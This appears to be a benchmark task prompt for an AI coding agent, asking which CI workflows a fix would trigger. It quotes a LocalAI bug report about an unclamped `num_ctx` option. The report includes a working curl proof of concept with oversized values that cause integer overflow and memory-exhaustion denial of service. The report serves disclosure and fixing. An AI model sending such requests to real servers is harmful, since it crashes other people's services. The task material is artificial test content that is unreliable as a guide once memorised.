# Recover the symbolic verification state this change produces

A regression report was filed against `mudler/LocalAI`.  The report is quoted verbatim below.

## Report

```
Bug 8: Unbounded `num_ctx` in `/api/chat` and `/api/generate` bypasses hardware-aware context-size clamping

**LocalAI version:**
commit `05b8d8aa` (2026-07-14, master)

**Environment, CPU architecture, OS, and Version:**
Linux x86_64. Docker container built from the repo Dockerfile with `-race` instrumentation. Not architecture specific.

**Describe the bug**

`applyOllamaOptions(input.Options, cfg)` (`core/http/endpoints/ollama/helpers.go:59-61`) sets `cfg.ContextSize` directly from the client-supplied `options.num_ctx` with only a `> 0` check:

```go
if opts.NumCtx > 0 {
    cfg.ContextSize = &opts.NumCtx
}
```

There is no upper bound. This overrides the hardware-aware `autoContextSize` clamp that `middleware.SetModelAndConfig` normally applies. The value then flows unmodified through `core/backend.grpcModelOpts` and `EffectiveContextSize(c)` into `ContextSize: int32(ctxSize)` (`core/backend/options.go:355`), sent as-is to the backend's `LoadModel` gRPC call.

Because the cast is `int32(ctxSize)`, a client value above `2^31-1` silently wraps into a negative `ContextSize`. `POST /api/generate` (`core/http/endpoints/ollama/generate.go`) applies the exact same unclamped `options.num_ctx` handling, so both Ollama-compatible endpoints share this defect.

**To Reproduce**

```bash
mkdir -p /tmp/localai-poc-bug8 && cd /tmp/localai-poc-bug8

mkdir -p models
for m in a b c; do
cat > "models/mock-model-$m.yaml" <<EOF
name: mock-model-$m
backend: mock-backend
parameters:
  model: mock-model.bin
EOF
done
touch models/mock-model.bin

docker network create localai-audit-net 2>/dev/null || true

docker run -d --rm --network localai-audit-net \
  --name laudit-victim \
  -p 0:8080 -v "$PWD/models:/models" \
  localai-audit:latest run --address 0.0.0.0:8080 \
  --models-path /models --api-keys "" --log-level debug \
  --external-grpc-backends "mock-backend:/usr/local/bin/mock-backend"

sleep 5
PORT=$(docker port laudit-victim 8080 | head -1 | sed 's/.*://')
BASE="http://127.0.0.1:$PORT"

echo "=== baseline: mock-model-a, num_ctx=512 (sane) ==="
curl -sS -m 15 -w '\nHTTP_STATUS=%{http_code}\n' "$BASE/api/chat" \
  -H 'Content-Type: application/json' \
  -d '{"model":"mock-model-a","messages":[{"role":"user","content":"hi"}],"stream":false,"options":{"num_ctx":512}}'

echo "=== attack: mock-model-b, num_ctx=2000000000 (huge, still < int32 max) ==="
curl -sS -m 15 -w '\nHTTP_STATUS=%{http_code}\n' "$BASE/api/chat" \
  -H 'Content-Type: application/json' \
  -d '{"model":"mock-model-b","messages":[{"role":"user","content":"hi"}],"stream":false,"options":{"num_ctx":2000000000}}'

echo "=== attack: mock-model-c, num_ctx=3000000000 (> int32 max, triggers overflow) ==="
curl -sS -m 15 -w '\nHTTP_STATUS=%{http_code}\n' "$BASE/api/chat" \
  -H 'Content-Type: application/json' \
  -d '{"model":"mock-model-c","messages":[{"role":"user","content":"hi"}],"stream":false,"options":{"num_ctx":3000000000}}'

sleep 2
echo "=== effective ContextSize per model, as logged by local-ai itself ==="
docker logs laudit-victim 2>&1 | grep -i "effective runtime tuning"
docker logs laudit-victim 2>&1 | grep -i "GRPC: Loading model with options"
```

Three distinct model names are used because LocalAI caches one running backend process per model name and does not resend `ModelOptions` on repeat requests to an already-loaded model, so each name gets its own fresh `LoadModel` call to observe.

**Expected behavior**

`options.num_ctx` should be clamped to a hardware-aware maximum before being sent to the backend, and any value that would overflow `int32` should be rejected outright.

**Logs**

```
effective runtime tuning ... modelID="mock-model-a" context=512
effective runtime tuning ... modelID="mock-model-b" context=2000000000

GRPC: Loading model with options ... ContextSize:512 ...          (mock-model-a)
GRPC: Loading model with options ... ContextSize:2000000000 ...   (mock-model-b)
GRPC: Loading model with options ... ContextSize:-1294967296 ...  (mock-model-c)
```

`3000000000 - 2^32 = -1294967296`, exactly matching the logged value for `mock-model-c`, confirming the `int32(ctxSize)` overflow.

**Additional context**

All three requests return HTTP 200 and the container stays up (`exitcode=0 oomkilled=false`), since the mock backend does not itself allocate memory proportional to `n_ctx`. The vulnerability is the unbounded, unclamped plumbing of client input into `ModelOptions.ContextSize`, which a real GGUF/llama.cpp-backed deployment turns into an actual KV-cache allocation sized by the attacker's value. `POST /api/generate` was independently verified to exhibit the identical unclamped behavior. Prior audit verdict: `VERIFIED_BEHAVIOR`.

### Impact

Any caller able to reach `/api/chat` or `/api/generate` can set `options.num_ctx` to an arbitrary value with no upper bound, overriding the server's hardware-aware context-size clamp. Against a real backend this drives a KV-cache allocation sized by attacker input, causing memory exhaustion or an OOM crash. A value above `2^31-1` additionally overflows the `int32` cast into a negative `ContextSize`, an unpredictable value no backend expects, which can crash or misbehave depending on how the backend's context-allocation logic handles it.

### Fix

In `applyOllamaOptions`, clamp `opts.NumCtx` to the same hardware-aware maximum `autoContextSize` computes, rejecting or capping any value above it before it reaches `cfg.ContextSize`. Reject values that would overflow `int32` outright rather than allowing the cast to silently wrap.
```

## What you have

- `/testbed/repo` is the repository checked out at the **pre-change** commit `5c96e097ba9770c091f2b9d2897c09fffae4a7c7`.  There
  is no git history: read the files directly.
- The pull request that actually fixed this issue is **not** in the container and cannot be fetched.

## Evaluation context

Assume the prospective fix has just **updated an existing non-draft pull request**.

- PR lifecycle action: `synchronize`
- target branch: `master`
- consider both `pull_request` and `pull_request_target` trigger families
- apply the repository's native `types`, `branches`, `branches-ignore`, `paths`, `paths-ignore`
- direct workflow activation only; no push/workflow_dispatch/schedule/workflow_run

## What to produce

Write JSON to `/testbed/answer.json`:

```json
{"case_id": "mudler_LocalAI__11022__5c96e09",
  "activated_workflows": [".github/workflows/test.yml"]}
```

- list every workflow under `repo/.github/workflows/` that this change would activate
- workflow paths exactly as under `repo/.github/workflows/`; a path that does not exist scores 0

## Rules

- Do **not** use the network. Fetching the upstream fix is cheating and is detected.
- Solve it from the repository.
